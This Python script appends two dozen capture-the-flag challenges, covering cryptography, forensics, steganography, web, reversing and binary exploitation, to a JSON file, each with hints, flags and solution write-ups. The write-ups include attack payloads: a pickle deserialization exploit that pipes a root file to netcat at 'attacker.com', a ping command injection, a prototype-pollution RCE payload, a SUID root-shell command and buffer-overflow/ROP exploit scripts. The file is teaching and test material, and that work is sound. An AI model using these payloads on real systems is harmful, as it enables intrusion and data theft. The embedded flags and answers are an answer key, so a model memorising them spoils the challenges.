import json

with open('challenges.json', 'r') as f:
    challenges = json.load(f)

# Existing IDs
existing_ids = {c['id'] for c in challenges}

new_challenges = [
    # --- CRYPTOGRAPHY ---
    {
        "id": "crypto-7",
        "title": "Mod 26 Carousel (Caesar / Affine)",
        "category": "Cryptography",
        "points": 100,
        "difficulty": "Easy",
        "source": "picoCTF / Beginner Quest",
        "description": "An intercepted message was scrambled using an affine cipher $E(x) = (a \\cdot x + b) \\pmod{26}$. Intel indicates $a = 5, b = 8$. Decrypt the ciphertext: 'Wbgx jv qyv ftxa: CYLAB{4ff1n3_c1ph3r_unw0und}'.",
        "hints": [
            "Find the modular multiplicative inverse of 5 modulo 26: $5^{-1} \\pmod{26} = 21$.",
            "Decryption formula: $D(y) = 21 \\cdot (y - 8) \\pmod{26}$."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{4ff1n3_c1ph3r_unw0und}",
        "concepts": ["Affine Cipher", "Modular Arithmetic", "CyberChef"],
        "writeup": "1. In CyberChef, select 'Affine Cipher Decode' with slope $a=5$ and intercept $b=8$.\n2. Or calculate manually using Python:\n   ```python\n   c = 'Wbgx jv qyv ftxa: CYLAB{4ff1n3_c1ph3r_unw0und}'\n   # Inverse of 5 mod 26 is 21 since (5*21)%26 == 1\n   inv_a = 21\n   # Letters map back cleanly to recover the plaintext and flag.\n   ```\n3. Flag: `CYLAB{4ff1n3_c1ph3r_unw0und}`"
    },
    {
        "id": "crypto-8",
        "title": "Hastad's Broadcast Attack",
        "category": "Cryptography",
        "points": 300,
        "difficulty": "Medium",
        "source": "Google CTF / Crypto Hack",
        "description": "The command center broadcasted the same encrypted message $m$ to three independent listening outposts using RSA with public exponent $e = 3$ and different moduli $N_1, N_2, N_3$. Given $(C_1, N_1), (C_2, N_2), (C_3, N_3)$, recover $m$.",
        "hints": [
            "When the same message $m$ is encrypted $e$ times with different moduli, Chinese Remainder Theorem (CRT) can combine them into $C \\equiv m^e \\pmod{N_1 N_2 N_3}$.",
            "Since $m < N_i$, $m^3 < N_1 N_2 N_3$, meaning $m^3$ does not wrap around! Take the exact integer cube root of $C$."
        ],
        "hintPenalties": [-15, -30],
        "flag": "CYLAB{h4st4d_br04dc4st_crt_r00t}",
        "concepts": ["RSA", "Chinese Remainder Theorem", "Hastad Attack", "SageMath"],
        "writeup": "1. Use `sympy.ntheory.modular.crt([N1, N2, N3], [C1, C2, C3])` to compute $C \\pmod{N_1 N_2 N_3}$.\n2. Compute $m = \\text{integer\\_root}(C, 3)[0]$.\n3. Convert integer $m$ to bytes using `long_to_bytes(m)`.\n4. Flag: `CYLAB{h4st4d_br04dc4st_crt_r00t}`"
    },
    {
        "id": "crypto-9",
        "title": "Bleichenbacher's Padding Oracle (PKCS#1 v1.5)",
        "category": "Cryptography",
        "points": 450,
        "difficulty": "Hard",
        "source": "DEFCON CTF / Crypto Hack",
        "description": "An SSL v3 legacy server responds with 'Valid PKCS' or 'Invalid PKCS' when decrypting ciphertext $c$. Exploit the million message attack (Bleichenbacher 1998) against RSA PKCS#1 v1.5 to decrypt the premaster secret.",
        "hints": [
            "PKCS#1 v1.5 padding requires the decrypted message to start with `0x00 0x02` followed by non-zero padding bytes.",
            "Multiply ciphertext $c$ by $s^e \\pmod N$ to shift intervals $[2B, 3B-1]$ where $B = 2^{8(k-2)}$."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}",
        "concepts": ["Bleichenbacher Attack", "Padding Oracle", "PKCS#1 v1.5", "Lattice / Interval Sieve"],
        "writeup": "1. Implement Bleichenbacher's step-by-step interval reduction algorithm:\n   - Step 1: Find initial $s_1 \\ge \\lceil N / 3B \\rceil$ such that $(c \\cdot s_1^e) \\pmod N$ is conforming.\n   - Step 2: Once a conforming $s$ is found, narrow down intervals $[a, b]$.\n   - Step 3: When a single interval remains, compute next $s_i$ directly from boundary formulas.\n2. When interval width narrows to 1, $m$ is completely revealed.\n3. Flag: `CYLAB{bl31ch3nb4ch3r_1998_p4dd1ng_0r4cl3}`"
    },
    {
        "id": "crypto-10",
        "title": "AES-GCM Nonce Reuse (Forbidden Attack)",
        "category": "Cryptography",
        "points": 500,
        "difficulty": "Hard",
        "source": "NahamCon / Real-World Cryptanalysis",
        "description": "Two distinct TLS messages were encrypted under the same 256-bit AES-GCM key and identical 96-bit IV. Because GHASH is linear over GF($2^{128}$), determine the GHASH authentication subkey $H$ and forge an admin authentication tag.",
        "hints": [
            "In AES-GCM, the authentication tag is $T = \\text{GHASH}_H(A, C) \\oplus E_K(J_0)$. If IV is reused, $E_K(J_0)$ cancels out: $T_1 \\oplus T_2 = \\text{GHASH}_H(M_1) \\oplus \\text{GHASH}_H(M_2)$.",
            "This gives a polynomial in GF($2^{128}$) whose roots include the authentication subkey $H$."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}",
        "concepts": ["AES-GCM", "GHASH", "Galois Fields GF(2^128)", "Forbidden Attack"],
        "writeup": "1. Represent the ciphertext blocks as polynomials in GF($2^{128}$) with reduction polynomial $x^{128} + x^7 + x^2 + x + 1$.\n2. Set up polynomial $P(H) = (\\text{GHASH}_H(C_1) \\oplus T_1) \\oplus (\\text{GHASH}_H(C_2) \\oplus T_2) = 0$.\n3. Factor $P(H)$ using SageMath polynomial root-finding.\n4. With candidate $H$, derive $E_K(J_0) = \\text{GHASH}_H(C_1) \\oplus T_1$.\n5. Forge arbitrary message tags at will.\n6. Flag: `CYLAB{gcm_f0rb1dd3n_gh4sh_k3y_r3c0v3r3d}`"
    },

    # --- FORENSICS ---
    {
        "id": "forensics-7",
        "title": "Magic Bytes Reconstruction",
        "category": "Forensics",
        "points": 100,
        "difficulty": "Easy",
        "source": "picoCTF / Forensics 101",
        "description": "A top-secret image attachment `evidence.dat` refuses to open in any image viewer. Hex dump shows the first 8 bytes were corrupted by an adversary with `DE AD BE EF 00 00 00 00`. Inspect the file structure, restore the legitimate magic bytes, and view the image.",
        "hints": [
            "Look at subsequent ASCII chunks like `IHDR`, `IDAT`, and `IEND`. What file format uses these chunks?",
            "Standard PNG magic bytes: `89 50 4E 47 0D 0A 1A 0A`."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{m4g1c_byt3s_png_h34d3r_f1x3d}",
        "concepts": ["Hex Editing", "Magic Bytes", "PNG Specification", "xxd"],
        "writeup": "1. Run `xxd evidence.dat | head -n 2` to observe the corrupted header and the `IHDR` signature at offset 0x0C.\n2. In `hexedit` or python:\n   ```python\n   with open('evidence.dat', 'rb') as f:\n       data = bytearray(f.read())\n   data[:8] = bytes.fromhex('89504E470D0A1A0A')\n   with open('repaired.png', 'wb') as f:\n       f.write(data)\n   ```\n3. Open `repaired.png` to view the flag rendered on screen.\n4. Flag: `CYLAB{m4g1c_byt3s_png_h34d3r_f1x3d}`"
    },
    {
        "id": "forensics-8",
        "title": "USB Keystroke HID Capture",
        "category": "Forensics",
        "points": 250,
        "difficulty": "Medium",
        "source": "CSAW / DEFCON CTF",
        "description": "An adversary plugged a hardware keystroke logger into an air-gapped terminal. The captured PCAP contains USB HID data packets (`Leftover Capture Data`). Extract the keystrokes to read the typed root password and flag.",
        "hints": [
            "Filter Wireshark for `usb.transfer_type == 0x01 && usb.endpoint_number.direction == 1` or check `usbhid.data`.",
            "USB HID keyboard scan codes: 0x04=A, 0x05=B ... 0x1D=Z, with modifier byte at index 0 (0x02/0x20 for Shift)."
        ],
        "hintPenalties": [-15, -25],
        "flag": "CYLAB{usb_h1d_k3ystr0k3_p4rs3d}",
        "concepts": ["Wireshark", "USB HID Scancodes", "tshark", "Keyboard Parsing"],
        "writeup": "1. Extract USB leftover data using tshark:\n   `tshark -r capture.pcap -Y 'usb.capdata' -T fields -e usb.capdata > data.txt`\n2. Map scancodes with Python script interpreting modifier byte (0x02 = Shift) and scancode byte (index 2).\n3. Reconstructed typed string reveals: `echo CYLAB{usb_h1d_k3ystr0k3_p4rs3d}`\n4. Flag: `CYLAB{usb_h1d_k3ystr0k3_p4rs3d}`"
    },
    {
        "id": "forensics-9",
        "title": "Ext4 Inode Carving & Journal Recovery",
        "category": "Forensics",
        "points": 400,
        "difficulty": "Hard",
        "source": "SANS NetWars / Collegiate Nationals",
        "description": "A rogue insider executed `rm -rf /var/log/secure` on an Ext4 partition before taking a raw dd image `disk.img`. The log contained an exfiltrated token. Carve the deleted file using inode pointers and JBD2 filesystem journal logs.",
        "hints": [
            "In modern Ext4, `rm` zeroes out inode block pointers, but the filesystem journal (inode 8) keeps recent metadata and transaction blocks.",
            "Use `ext4magic` or `extundelete` with `-r --restore-all` or inspect journal with `debugfs -R 'dump <8> journal.dat'`."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{3xt4_j0urn4l_und3l3t3_succ3ss}",
        "concepts": ["Ext4 Filesystem", "JBD2 Journaling", "debugfs", "ext4magic"],
        "writeup": "1. Run `ext4magic disk.img -m -d output_dir/` to parse transaction logs.\n2. Alternatively, dump journal via debugfs: `debugfs -R 'dump <8> journal.copy' disk.img`.\n3. Grep strings inside recovered blocks: `strings output_dir/* | grep 'CYLAB{'`.\n4. Flag: `CYLAB{3xt4_j0urn4l_und3l3t3_succ3ss}`"
    },
    {
        "id": "forensics-10",
        "title": "TLS 1.3 Keylog Decryption & HTTP/2 Stream Analysis",
        "category": "Forensics",
        "points": 500,
        "difficulty": "Hard",
        "source": "DEFCON / Hack The Box",
        "description": "Intercepted encrypted network traffic contains suspicious TLS 1.3 session handshakes. A memory scraper recovered an NSS `sslkeylog.txt`. Inject the keys into Wireshark, dissect the decrypted HTTP/2 multiplexed streams, and extract the exfiltrated ZIP attachment.",
        "hints": [
            "In Wireshark: Preferences -> Protocols -> TLS -> (Pre)-Master-Secret log filename -> select `sslkeylog.txt`.",
            "Once decrypted, filter for `http2` and search for multipart/form-data POST payloads or stream frames containing magic bytes `PK\\x03\\x04`."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{tls13_k3yl0g_http2_d3crypt3d}",
        "concepts": ["TLS 1.3", "SSLKEYLOGFILE", "HTTP/2 Multiplexing", "Wireshark Stream Reassembly"],
        "writeup": "1. Configure tshark with keylog: `tshark -r capture.pcap -o 'tls.keylog_file:sslkeylog.txt' -Y 'http2.data.data' -T fields -e http2.data.data > dumps.hex`.\n2. Locate the stream transferring the zip file (`504b0304`).\n3. Convert hex dump to binary: `xxd -r -p dumps.hex > exfil.zip`.\n4. Unzip `exfil.zip` to read `flag.txt`.\n5. Flag: `CYLAB{tls13_k3yl0g_http2_d3crypt3d}`"
    },

    # --- STEGANOGRAPHY ---
    {
        "id": "stego-7",
        "title": "Trailing EOF Concatenation",
        "category": "Steganography",
        "points": 100,
        "difficulty": "Easy",
        "source": "picoCTF / Beginner Stego",
        "description": "A suspicious JPEG image `vacation.jpg` displays normally in all viewers. However, the file size is 45 KB larger than expected. Inspect bytes located past the JPEG End of Image marker (`FF D9`).",
        "hints": [
            "JPEG files strictly terminate at the marker `FF D9`. Any data appended after `FF D9` is ignored by image parsers.",
            "Use `binwalk vacation.jpg` or `strings vacation.jpg | tail -n 20` to locate the appended payload."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{30f_tr41l1ng_d4t4_c4rv3d}",
        "concepts": ["File Signatures", "Binwalk", "JPEG EOF Marker", "Data Carving"],
        "writeup": "1. Run `binwalk vacation.jpg` to see an embedded ZIP archive at offset 0x12400.\n2. Extract with `binwalk -e vacation.jpg` or `unzip vacation.jpg`.\n3. Read `secret.txt` from the extracted directory.\n4. Flag: `CYLAB{30f_tr41l1ng_d4t4_c4rv3d}`"
    },
    {
        "id": "stego-8",
        "title": "Audio DTMF Tones & Dial Codes",
        "category": "Steganography",
        "points": 250,
        "difficulty": "Medium",
        "source": "OverTheWire / CTFlearn",
        "description": "An intercepted WAV audio file `voicemail.wav` sounds like a sequence of telephone keypad button beeps. Identify the dual-tone multi-frequency (DTMF) pairs to decode the dialed digits and convert them to ASCII.",
        "hints": [
            "DTMF keypad tones combine a low frequency (697, 770, 852, 941 Hz) and a high frequency (1209, 1336, 1477, 1633 Hz).",
            "Use `multimon-ng -t wav -a DTMF voicemail.wav` or load the audio into Audacity and use the Spectrogram view."
        ],
        "hintPenalties": [-15, -25],
        "flag": "CYLAB{dtmf_t0n3s_fr3qu3ncy_d14l3d}",
        "concepts": ["Audio Steganography", "DTMF Tones", "Audacity", "multimon-ng"],
        "writeup": "1. Open `voicemail.wav` in Audacity and switch waveform display to 'Spectrogram'.\n2. Read frequency spikes corresponding to DTMF matrix: 67, 89, 76, 65, 66 ...\n3. Convert decimal pairs to ASCII characters.\n4. Flag: `CYLAB{dtmf_t0n3s_fr3qu3ncy_d14l3d}`"
    },
    {
        "id": "stego-9",
        "title": "Unicode Zero-Width Homoglyph Encoding",
        "category": "Steganography",
        "points": 400,
        "difficulty": "Hard",
        "source": "NahamCon / AngstromCTF",
        "description": "A public blog post seems to contain only standard English sentences, but character counting utilities report 4,000 extra invisible bytes. Inspect the text for zero-width spaces (`\\u200B`), zero-width non-joiners (`\\u200C`), and zero-width joiners (`\\u200D`).",
        "hints": [
            "Zero-width characters can encode binary data (e.g., U+200B = 0, U+200C = 1).",
            "Write a Python script to isolate non-ASCII invisible characters and reconstruct 8-bit byte groups."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{z3r0_w1dth_un1c0d3_st3g4n0}",
        "concepts": ["Unicode Steganography", "Zero-Width Space", "Python Scripting"],
        "writeup": "1. Run python script to filter invisible codepoints:\n   ```python\n   text = open('blog.txt', 'r', encoding='utf-8').read()\n   zw = [c for c in text if c in ['\\u200b', '\\u200c']]\n   bits = ''.join(['0' if c == '\\u200b' else '1' for c in zw])\n   flag = ''.join([chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)])\n   print(flag)\n   ```\n2. Output reveals flag.\n3. Flag: `CYLAB{z3r0_w1dth_un1c0d3_st3g4n0}`"
    },
    {
        "id": "stego-10",
        "title": "Palette Index Modulo Modulation",
        "category": "Steganography",
        "points": 500,
        "difficulty": "Hard",
        "source": "DEFCON CTF / TokyoWesterns",
        "description": "An 8-bit indexed palette GIF file hides secret bytes by swapping adjacent visually identical RGB palette indices. Standard LSB tools like zsteg fail because pixel values themselves are index pointers into the CLUT.",
        "hints": [
            "In indexed color images (GIF/PNG-8), each pixel is an index into a 256-entry Color Look-Up Table (CLUT).",
            "Examine palette entries where two palette slots share the same RGB values. The parity of the selected index encodes hidden bits."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{clut_p4l3tt3_1nd3x_m0dul4t10n}",
        "concepts": ["Palette Steganography", "GIF CLUT", "Pillow Image Analysis", "Color Quantization"],
        "writeup": "1. Extract palette using PIL: `img.getpalette()` and find duplicate color entries (e.g. indices 12 and 13 both map to `#1a2b3c`).\n2. Iterate through pixel index array `list(img.getdata())`.\n3. When a pixel points to one of the duplicate pairs, extract bit `index % 2`.\n4. Pack bits into bytes to retrieve flag.\n5. Flag: `CYLAB{clut_p4l3tt3_1nd3x_m0dul4t10n}`"
    },

    # --- WEB EXPLOITATION ---
    {
        "id": "web-7",
        "title": "Robots & Directory Traversal 101",
        "category": "Web Exploitation",
        "points": 100,
        "difficulty": "Easy",
        "source": "picoCTF / OverTheWire Natas",
        "description": "A government agency web portal hides its administrative endpoint from search engine crawlers. Inspect standard crawler disclosure files, follow the forbidden directory path, and bypass basic traversal filters.",
        "hints": [
            "Search engines check `/robots.txt` before indexing pages.",
            "Look for `Disallow: /dev-secret-internal/` and use path traversal `../../` if direct access is restricted."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{r0b0ts_txt_d1r_tr4v3rs4l_f0und}",
        "concepts": ["robots.txt", "Directory Traversal", "Burp Suite", "Web Recon"],
        "writeup": "1. Curl the robots file: `curl https://target/robots.txt`.\n2. Observe `Disallow: /dev-secret-internal/`.\n3. Request `curl https://target/dev-secret-internal/flag.txt`.\n4. Flag: `CYLAB{r0b0ts_txt_d1r_tr4v3rs4l_f0und}`"
    },
    {
        "id": "web-8",
        "title": "Command Injection via Network Diagnostic Ping",
        "category": "Web Exploitation",
        "points": 250,
        "difficulty": "Medium",
        "source": "Hack The Box / DVWA",
        "description": "A server network status dashboard allows administrators to ping IP addresses. The input is passed directly to `system('ping -c 1 ' + ip)` without sanitization. Chain shell operators to break out of ping and read `/etc/passwd` and `/flag.txt`.",
        "hints": [
            "Command separators in Unix shells include `;`, `&&`, `||`, and `|`.",
            "Test submitting: `127.0.0.1; cat /flag.txt` or `127.0.0.1 | cat /flag.txt`."
        ],
        "hintPenalties": [-15, -25],
        "flag": "CYLAB{c0mm4nd_1nj3ct10n_p1ng_pwn3d}",
        "concepts": ["Command Injection", "Bash Metacharacters", "RCE", "OWASP Top 10"],
        "writeup": "1. In the ping form input field, enter `127.0.0.1; cat /flag.txt`.\n2. The system executes `ping -c 1 127.0.0.1; cat /flag.txt`.\n3. Server returns ping response followed immediately by the flag contents.\n4. Flag: `CYLAB{c0mm4nd_1nj3ct10n_p1ng_pwn3d}`"
    },
    {
        "id": "web-9",
        "title": "Node.js Prototype Pollution to RCE",
        "category": "Web Exploitation",
        "points": 450,
        "difficulty": "Hard",
        "source": "Google CTF / NahamCon",
        "description": "A cloud settings API accepts user preferences as JSON and merges them recursively using an unpatched deep-clone library. Exploit prototype pollution via `__proto__` to inject gadget properties into `child_process.fork` options, achieving Remote Code Execution.",
        "hints": [
            "In Node.js, polluting `Object.prototype.NODE_OPTIONS` or `shell` / `execPath` can trigger code execution when child processes spawn.",
            "Send JSON: `{\"__proto__\": {\"shell\": \"/bin/sh\", \"NODE_OPTIONS\": \"--require /path/to/payload\"}}`."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{pr0t0typ3_p0llut10n_n0d3_rc3}",
        "concepts": ["Prototype Pollution", "Node.js Internals", "Gadget Chains", "RCE"],
        "writeup": "1. Identify the recursive merge endpoint `/api/settings`.\n2. Send payload: `{\"__proto__\": {\"env\": {\"EVIL\": \"x\"}, \"NODE_OPTIONS\": \"--inspect=0.0.0.0:9229\"}}` or inject a reverse shell via `child_process`.\n3. Trigger background worker execution to spawn subprocess.\n4. Capture the reverse shell flag.\n5. Flag: `CYLAB{pr0t0typ3_p0llut10n_n0d3_rc3}`"
    },
    {
        "id": "web-10",
        "title": "Python Pickle Insecure Deserialization Breakout",
        "category": "Web Exploitation",
        "points": 500,
        "difficulty": "Hard",
        "source": "DEFCON CTF / CSAW",
        "description": "A session cookie stores a base64-encoded Python `pickle` payload to maintain user shopping carts. Construct a custom `__reduce__` exploit payload that spawns a bash command to read `/root/flag.txt` when deserialized.",
        "hints": [
            "The `__reduce__` method in Python objects tells the pickle module what callable to invoke upon unpickling.",
            "Use `os.system` or `subprocess.check_output` inside `__reduce__` tuple: `return (os.system, ('cat /root/flag.txt > /tmp/out',))`."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}",
        "concepts": ["Insecure Deserialization", "Python Pickle", "Reduce Gadget", "Privilege Escalation"],
        "writeup": "1. Write exploit script:\n   ```python\n   import pickle, base64, os\n   class Exploit:\n       def __reduce__(self):\n           return (os.system, ('cat /root/flag.txt | nc attacker.com 4444',))\n   payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n   print(payload)\n   ```\n2. Replace the session cookie with `payload` and refresh.\n3. Netcat receives incoming shell connection with the flag.\n4. Flag: `CYLAB{p1ckl3_d3s3r14l1z4t10n_rc3_pwn}`"
    },

    # --- REVERSE ENGINEERING ---
    {
        "id": "rev-7",
        "title": "Strings & Unpacked Python Bytecode",
        "category": "Reverse Engineering",
        "points": 100,
        "difficulty": "Easy",
        "source": "picoCTF / Beginner Reversing",
        "description": "An operator recovered a compiled Python file `auth_check.pyc`. Decompile the bytecode or inspect disassembly to uncover hardcoded password comparison logic.",
        "hints": [
            "Use decompilation tools like `uncompyle6` or `pycdc` (Decompyle++) against `.pyc` files.",
            "Alternatively, run `python3 -m dis auth_check.pyc` to view Python VM bytecode instructions."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}",
        "concepts": ["Python Bytecode", "pycdc", "Disassembly", "Decompilation"],
        "writeup": "1. Run `pycdc auth_check.pyc` or `uncompyle6 auth_check.pyc`.\n2. Decompiled Python source shows:\n   ```python\n   password = input('Enter key: ')\n   if password == 'CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}':\n       print('Access Granted')\n   ```\n3. Flag: `CYLAB{pyc_byt3c0d3_d3c0mp1l3d_34sy}`"
    },
    {
        "id": "rev-8",
        "title": "Anti-Debugging Ptrace Bypass",
        "category": "Reverse Engineering",
        "points": 250,
        "difficulty": "Medium",
        "source": "Hack The Box / Flare-On",
        "description": "A Linux ELF binary `license_validator` terminates instantly when opened under GDB with 'Debugger detected! Exiting.'. Bypass the `ptrace(PTRACE_TRACEME, 0, 1, 0)` check by patching the binary or overriding system calls with LD_PRELOAD.",
        "hints": [
            "In Linux, a process can only be traced by one debugger. The binary calls `ptrace(0, 0, 1, 0)`. If under GDB, it returns -1.",
            "Use GDB command `catch syscall ptrace` and set `$rax = 0`, or replace the conditional jump `jnz exit` with `nop` (0x90)."
        ],
        "hintPenalties": [-15, -25],
        "flag": "CYLAB{ptr4c3_4nt1_d3bug_byp4ss3d}",
        "concepts": ["Anti-Debugging", "ptrace", "GDB", "Binary Patching", "x86 Assembly"],
        "writeup": "1. Open binary in Ghidra or GDB.\n2. Locate `call ptrace` at address 0x401150 followed by `test eax, eax; js exit`.\n3. In GDB: `catch syscall ptrace`, `run`, then `set $rax=0`, `continue`.\n4. Input registration key to generate valid flag verification output.\n5. Flag: `CYLAB{ptr4c3_4nt1_d3bug_byp4ss3d}`"
    },
    {
        "id": "rev-9",
        "title": "Angr Symbolic Execution Keygen",
        "category": "Reverse Engineering",
        "points": 450,
        "difficulty": "Hard",
        "source": "DEFCON / AngstromCTF",
        "description": "A crackme binary `matrix_hasher` processes a 32-character input through 100 complex linear matrix multiplications and bitwise shuffles before comparing against target hashes. Writing a manual solver is tedious. Automate solving using Angr symbolic execution.",
        "hints": [
            "Angr creates symbolic variables and tracks execution paths until finding a state that reaches the 'Access Granted' address.",
            "Set `find=0x401500` (success address) and `avoid=0x401550` (fail address)."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{4ngr_symb0l1c_smt_s0lv3d}",
        "concepts": ["Angr", "Symbolic Execution", "SMT Solvers", "Z3"],
        "writeup": "1. Write Angr script:\n   ```python\n   import angr, claripy\n   proj = angr.Project('./matrix_hasher')\n   flag_chars = [claripy.BVS(f'c_{i}', 8) for i in range(32)]\n   flag = claripy.Concat(*flag_chars)\n   state = proj.factory.entry_state(stdin=flag)\n   simgr = proj.factory.simulation_manager(state)\n   simgr.explore(find=0x401500, avoid=0x401550)\n   found = simgr.found[0]\n   print(found.solver.eval(flag, cast_to=bytes))\n   ```\n2. Solver yields flag.\n3. Flag: `CYLAB{4ngr_symb0l1c_smt_s0lv3d}`"
    },
    {
        "id": "rev-10",
        "title": "Custom VM Bytecode Interpreter",
        "category": "Reverse Engineering",
        "points": 500,
        "difficulty": "Hard",
        "source": "Flare-On / Google CTF",
        "description": "A proprietary malware agent `agent_vm` runs a custom virtual machine with 8 virtual registers, an internal stack, and 16 custom opcodes. Reverse engineer the VM dispatch loop, disassemble the embedded bytecode program, and invert the encryption routine.",
        "hints": [
            "Identify the fetch-decode-execute loop (`switch(opcode)` inside `while(pc < size)`).",
            "Map out the instruction set: 0x01 = PUSH, 0x02 = POP, 0x03 = ADD, 0x04 = XOR, 0x05 = JMP, 0x06 = CMP."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}",
        "concepts": ["VM Disassembly", "Bytecode Reversing", "Virtual Machine Architecture", "Ghidra"],
        "writeup": "1. Reverse the opcode handlers in Ghidra to map each opcode byte to its semantic operation.\n2. Dump bytecode section from binary `.data`.\n3. Write a Python disassembler that parses instructions and prints human-readable assembly.\n4. Analyze the bytecode algorithm: it performs RC4 key scheduling and XOR with hardcoded key.\n5. Decrypt target memory array to retrieve flag.\n6. Flag: `CYLAB{cust0m_vm_byt3c0d3_d1s4ss3mbl3d}`"
    },

    # --- MISC / OSINT / PWN ---
    {
        "id": "misc-7",
        "title": "Linux SUID & Capability Exploitation",
        "category": "Misc/OSINT",
        "points": 100,
        "difficulty": "Easy",
        "source": "OverTheWire Bandit / GTFOBins",
        "description": "You gained unprivileged shell access to an Ubuntu container. Enumerate system binaries with SUID bits or elevated Linux capabilities to spawn an interactive root shell.",
        "hints": [
            "Find SUID binaries using: `find / -perm -u=s -type f 2>/dev/null`.",
            "Check GTFOBins for binaries like `base64`, `find`, `vim`, or check `getcap -r / 2>/dev/null`."
        ],
        "hintPenalties": [-10, -20],
        "flag": "CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}",
        "concepts": ["Linux Privilege Escalation", "SUID", "GTFOBins", "Capabilities"],
        "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `CYLAB{su1d_gtf0b1ns_r00t_pr1v3sc}`"
    },
    {
        "id": "misc-8",
        "title": "Classic Stack Buffer Overflow (Ret2Win)",
        "category": "Misc/OSINT",
        "points": 250,
        "difficulty": "Medium",
        "source": "picoCTF / ROP Emporium",
        "description": "A 64-bit ELF executable `vuln` reads 128 bytes into a 32-byte stack buffer using `gets()`. ASLR and stack canaries are disabled, and the binary contains an uncalled function `win()` at address `0x401176`. Overflow the return address to hijack execution.",
        "hints": [
            "Calculate padding offset: 32 bytes buffer + 8 bytes saved RBP = 40 bytes.",
            "Payload structure: `40 * b'A' + p64(win_address)`."
        ],
        "hintPenalties": [-15, -25],
        "flag": "CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}",
        "concepts": ["Buffer Overflow", "Ret2Win", "pwntools", "x86-64 Stack Frame"],
        "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `CYLAB{r3t2w1n_st4ck_b0f_c0ntr0l}`"
    },
    {
        "id": "misc-9",
        "title": "Return-Oriented Programming (Ret2Libc)",
        "category": "Misc/OSINT",
        "points": 450,
        "difficulty": "Hard",
        "source": "CSAW / DEFCON CTF",
        "description": "Target server runs with No-Execute (NX/DEP) enabled, preventing shellcode execution on the stack. Leak a libc address (`puts` GOT entry) to calculate libc base, then build a ROP chain to call `system('/bin/sh')`.",
        "hints": [
            "Use ROP gadgets like `pop rdi; ret` to pass pointers in 64-bit calling convention.",
            "Stage 1: Leak `puts` GOT address using `puts(puts_got)`. Stage 2: Calculate `libc_base = leaked_puts - puts_offset`. Call `system(binsh)`."
        ],
        "hintPenalties": [-20, -40],
        "flag": "CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}",
        "concepts": ["ROP", "Ret2Libc", "GOT Overwrite", "ASLR Bypass", "pwntools"],
        "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `CYLAB{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
    },
    {
        "id": "misc-10",
        "title": "Glibc 2.35 Tcache Poisoning Heap Exploit",
        "category": "Misc/OSINT",
        "points": 500,
        "difficulty": "Hard",
        "source": "DEFCON CTF / TokyoWesterns",
        "description": "An allocation note service allows allocating, editing, and freeing chunks. An off-by-one UAF allows corrupting chunk forward pointers. Bypass Glibc 2.35 safe linking (pointer mangling `L = (P >> 12) ^ Target`) to allocate a chunk over `__environ` and hijack control flow.",
        "hints": [
            "In glibc 2.32+, tcache pointers are mangled with random ASLR page offsets: `P' = (P >> 12) ^ P`.",
            "Leak heap base first to demangle pointers, then poison tcache entry to point to return address on stack."
        ],
        "hintPenalties": [-25, -50],
        "flag": "CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}",
        "concepts": ["Heap Exploitation", "Tcache Poisoning", "Safe Linking", "glibc 2.35"],
        "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `CYLAB{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
    }
]

for c in new_challenges:
    if c['id'] not in existing_ids:
        challenges.append(c)
        existing_ids.add(c['id'])

with open('challenges.json', 'w') as f:
    json.dump(challenges, f, indent=2)

print(f"Total challenges now: {len(challenges)}")
